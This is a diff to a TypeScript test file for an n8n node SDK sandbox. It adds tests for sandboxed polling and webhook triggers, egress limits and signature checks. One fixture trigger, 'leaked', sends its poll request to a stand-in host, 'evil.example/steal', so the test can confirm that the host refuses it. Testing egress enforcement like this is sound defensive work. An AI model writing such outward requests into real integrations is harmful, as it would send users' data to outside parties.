@@ -1,3 +1,4 @@
+import { createHmac } from 'node:crypto';
 import { existsSync } from 'node:fs';
 import { mkdtemp, readdir, rm, stat, writeFile } from 'node:fs/promises';
 import { createServer, type Server } from 'node:http';
@@ -6,25 +7,36 @@ import { tmpdir } from 'node:os';
 import path from 'node:path';
 import { Readable } from 'node:stream';
 import { isRecord } from '@n8n/utils/is-record';
-import type { IHttpRequestOptions, INode } from 'n8n-workflow';
+import type { IDataObject, IHttpRequestOptions, INode, INodeType } from 'n8n-workflow';
 
 import { compat, defineCredential, field } from '../credentials';
+import { setPermissionRefusalListener, type PermissionRefusal } from '../egress';
 import { freezeAction, GUEST_LACKS } from '../freeze';
 import { defineNode, t } from '../index';
 import { runRecorder } from '../profile';
-import { sandboxedVersionOf, warmSandbox, type SandboxOptions } from '../sandbox';
+import {
+	sandboxedVersionOf,
+	sandboxExecutorLoader,
+	warmSandbox,
+	type SandboxOptions,
+} from '../sandbox';
 import {
 	executorOf,
 	setCredentialManifests,
+	setExecutorLoader,
 	type BinaryStore,
+	type ContractOrigin,
 	type ExecutorHost,
+	type FrozenVersion,
 } from '../runtime';
+import { toVersionedTriggerType } from '../triggers';
 import { NODE_CONTRACT_VERSION } from '../version';
 
 const SANDBOX = path.resolve(__dirname, '..', '..', 'sandbox');
 const SIDECAR = path.join(SANDBOX, 'sidecar', 'target', 'release', 'n8n-sandbox');
 const GUESTS = path.join(SANDBOX, 'dist');
 const GUEST = path.join(GUESTS, 'action.wasm');
+const TRIGGER_GUEST = path.join(GUESTS, 'trigger.wasm');
 
 const acmeToken = () =>
 	defineCredential({
@@ -281,7 +293,7 @@ describe.skipIf(!existsSync(SIDECAR) || !existsSync(GUEST))('the sandbox', () =>
 		canary.hits = 0;
 	});
 
-	it('compiles both guests at warm-up, so a later run compiles nothing', async () => {
+	it('compiles each guest at warm-up, so a later run compiles nothing', async () => {
 		const warm = { ...options(), cacheDir: path.join(dirs.root, 'warm-cache') };
 		const compiled = async () => {
 			const files = (await readdir(warm.cacheDir)).filter((file) => file.endsWith('.cwasm')).sort();
@@ -291,7 +303,7 @@ describe.skipIf(!existsSync(SIDECAR) || !existsSync(GUEST))('the sandbox', () =>
 		};
 		await warmSandbox(warm);
 		const warmed = await compiled();
-		expect(warmed).toHaveLength(2);
+		expect(warmed).toHaveLength(3);
 		expect((await stat(warm.cacheDir)).mode & 0o777).toBe(0o700);
 		await expect(run('pollutionProbe', hostOf(), warm)).resolves.toBe('yes');
 		expect(await compiled()).toEqual(warmed);
@@ -769,3 +781,195 @@ describe.skipIf(!existsSync(SIDECAR) || !existsSync(GUEST))('the sandbox', () =>
 		expect(settled).toEqual(['rejected']);
 	});
 });
+
+const TRIGGERS = `import { defineNode, path, t } from '@n8n/node-sdk';
+const feed = defineNode({ id: 'feed', displayName: 'Feed', baseUrl: 'https://api.feed.test' });
+const change = t.obj({ id: t.str() });
+export const changed = feed.trigger('changed', {
+	trigger: 'On change',
+	summary: 'Starts on a change.',
+	input: {},
+	output: change,
+	poll: {
+		request: ({ since }) => ({ path: path\`/changes\`, query: { since } }),
+		response: t.arr(change),
+		items: (page) => page,
+		cursor: { id: (item) => Number(item.id) },
+		firstRun: 'emit',
+	},
+});
+export const leaked = feed.trigger('leaked', {
+	trigger: 'On leak',
+	summary: 'Starts on a leak.',
+	input: {},
+	output: change,
+	poll: {
+		request: () => ({ url: 'https://evil.example/steal' }),
+		response: t.arr(change),
+		items: (page) => page,
+		cursor: { id: (item) => Number(item.id) },
+	},
+});
+export const hooked = feed.trigger('hooked', {
+	trigger: 'On hook',
+	summary: 'Starts on a hook.',
+	input: {},
+	output: change,
+	webhook: {
+		verify: { algorithm: 'sha256', header: 'x-signature', secret: 'generated' },
+		register: {
+			create: ({ url, secret }) => ({ method: 'POST', path: path\`/hooks\`, body: { url, secret } }),
+			id: (body) => (body as { id?: string }).id,
+			check: ({ id }) => ({ path: path\`/hooks/\${id}\` }),
+			delete: ({ id }) => ({ method: 'DELETE', path: path\`/hooks/\${id}\` }),
+		},
+		emit: ({ body }) => [{ id: String(body.id) }],
+	},
+});
+`;
+
+describe.skipIf(!existsSync(SIDECAR) || !existsSync(TRIGGER_GUEST))(
+	'contract triggers in the sandbox',
+	() => {
+		const dirs = { root: '' };
+		const sent: IHttpRequestOptions[] = [];
+		const refusals: PermissionRefusal[] = [];
+		const options = (sidecar = SIDECAR): SandboxOptions => ({
+			sidecar,
+			guests: GUESTS,
+			cacheDir: path.join(dirs.root, 'cache'),
+			credentialType: () => undefined,
+			limits: { cpuMs: 1_000, memoryMb: 64, wallMs: 20_000 },
+		});
+		const versionOf = async (name: string, origin: ContractOrigin): Promise<FrozenVersion> => {
+			const { manifest, bundle } = await freezeAction(path.join(dirs.root, 'triggers.ts'), name);
+			return { manifest, origin, readBundle: async () => bundle };
+		};
+		/** The node type of a trigger with the loader of `N8N_NODE_CONTRACT_SANDBOX=stored`. */
+		const typeOf = async (version: FrozenVersion, sandbox = options()): Promise<INodeType> => {
+			setExecutorLoader(sandboxExecutorLoader(sandbox, ({ origin }) => origin === 'first-party'));
+			return new (toVersionedTriggerType([version]))().getNodeType(1);
+		};
+		const contextOf = (staticData: IDataObject, replies: unknown[]) => ({
+			getNode: () => node,
+			getNodeParameter: () => undefined,
+			getWorkflowStaticData: () => staticData,
+			getMode: () => 'trigger',
+			getNodeWebhookUrl: () => 'https://n8n.test/webhook/1',
+			getCredentials: async () => await Promise.resolve({}),
+			logger: { warn: () => undefined },
+			helpers: {
+				httpRequest: async (request: IHttpRequestOptions) => {
+					sent.push(request);
+					const body: unknown = replies.shift();
+					return await Promise.resolve(
+						request.returnFullResponse ? { body, headers: {}, statusCode: 200 } : body,
+					);
+				},
+			},
+		});
+
+		beforeAll(async () => {
+			dirs.root = await mkdtemp(path.join(tmpdir(), 'node-sdk-sandbox-triggers-'));
+			await writeFile(path.join(dirs.root, 'triggers.ts'), TRIGGERS);
+		});
+
+		afterAll(async () => {
+			setExecutorLoader(sandboxExecutorLoader(options(), () => true));
+			await rm(dirs.root, { recursive: true, force: true });
+		});
+
+		beforeEach(() => {
+			sent.length = 0;
+			refusals.length = 0;
+			setPermissionRefusalListener((refusal) => refusals.push(refusal));
+		});
+
+		afterEach(() => setPermissionRefusalListener(undefined));
+
+		it('polls a community trigger in the sandbox, and the host keeps its cursor', async () => {
+			const type = await typeOf(await versionOf('changed', 'community'));
+			const staticData: IDataObject = {};
+			const first = await type.poll?.call(contextOf(staticData, [[{ id: '1' }]]) as never);
+			expect(first?.[0]?.map(({ json }) => json)).toEqual([{ id: '1' }]);
+			expect(staticData.cursor).toBe('1');
+			const replies = [[{ id: '2' }, { id: '1' }]];
+			const second = await type.poll?.call(contextOf(staticData, replies) as never);
+			expect(second?.[0]?.map(({ json }) => json)).toEqual([{ id: '2' }]);
+			expect(sent.map(({ url, qs }) => [url, qs])).toEqual([
+				['https://api.feed.test/changes', {}],
+				['https://api.feed.test/changes', { since: '1' }],
+			]);
+		}, 30_000);
+
+		it('refuses a poll request outside the egress of the manifest in the host, and reports it', async () => {
+			const type = await typeOf(await versionOf('leaked', 'community'));
+			await expect(type.poll?.call(contextOf({}, [[]]) as never)).rejects.toThrow(
+				'Host not allowed: feed.leaked may send requests to api.feed.test, not to evil.example',
+			);
+			expect(sent).toEqual([]);
+			expect(refusals).toEqual([
+				expect.objectContaining({
+					action: 'feed.leaked',
+					permission: 'egress',
+					host: 'evil.example',
+				}),
+			]);
+		}, 30_000);
+
+		it('runs a first-party trigger in this process and a community trigger in the sandbox', async () => {
+			const missing = options(path.join(dirs.root, 'no-sidecar'));
+			const firstParty = await typeOf(await versionOf('changed', 'first-party'), missing);
+			const polled = await firstParty.poll?.call(contextOf({}, [[{ id: '1' }]]) as never);
+			expect(polled?.[0]?.map(({ json }) => json)).toEqual([{ id: '1' }]);
+			const community = await typeOf(await versionOf('changed', 'community'), missing);
+			await expect(community.poll?.call(contextOf({}, [[]]) as never)).rejects.toThrow(
+				'The sandbox did not start',
+			);
+		}, 30_000);
+
+		it('registers, checks, delivers and deletes the webhook of a sandboxed trigger', async () => {
+			const type = await typeOf(await versionOf('hooked', 'community'));
+			const hooks = type.webhookMethods?.default;
+			const data: IDataObject = {};
+			expect(await hooks?.create.call(contextOf(data, [{ id: 'h1' }]) as never)).toBe(true);
+			expect(data.webhookId).toBe('h1');
+			expect(data.webhookSecret).toMatch(/^[0-9a-f]{64}$/);
+			expect(await hooks?.checkExists.call(contextOf(data, [{}]) as never)).toBe(true);
+			const body = { id: 7 };
+			const rawBody = Buffer.from(JSON.stringify(body));
+			const deliver = async (secret: string) => {
+				const response = { status: () => response, send: () => response, end: () => response };
+				const signature = createHmac('sha256', secret).update(rawBody).digest('hex');
+				return await type.webhook?.call({
+					...contextOf(data, []),
+					getRequestObject: () => ({ rawBody }),
+					getHeaderData: () => ({ 'x-signature': signature }),
+					getBodyData: () => body,
+					getQueryData: () => ({}),
+					getResponseObject: () => response,
+				} as never);
+			};
+			expect(await deliver(data.webhookSecret as string)).toEqual({
+				workflowData: [[{ json: { id: '7' } }]],
+			});
+			expect(await deliver('forged')).toEqual({ noWebhookResponse: true });
+			expect(await hooks?.delete.call(contextOf(data, [{}]) as never)).toBe(true);
+			expect(data).toEqual({});
+			expect(sent.map(({ method, url }) => `${method ?? 'GET'} ${url}`)).toEqual([
+				'POST https://api.feed.test/hooks',
+				'GET https://api.feed.test/hooks/h1',
+				'DELETE https://api.feed.test/hooks/h1',
+			]);
+		}, 30_000);
+
+		it('refuses a sandboxed webhook bundle whose manifest drops its signature', async () => {
+			const version = await versionOf('hooked', 'community');
+			const { verify: _, ...contract } = version.manifest.contract;
+			const type = await typeOf({ ...version, manifest: { ...version.manifest, contract } });
+			await expect(
+				type.webhookMethods?.default?.create.call(contextOf({}, []) as never),
+			).rejects.toThrow('checks another webhook signature than its manifest');
+		}, 30_000);
+	},
+);
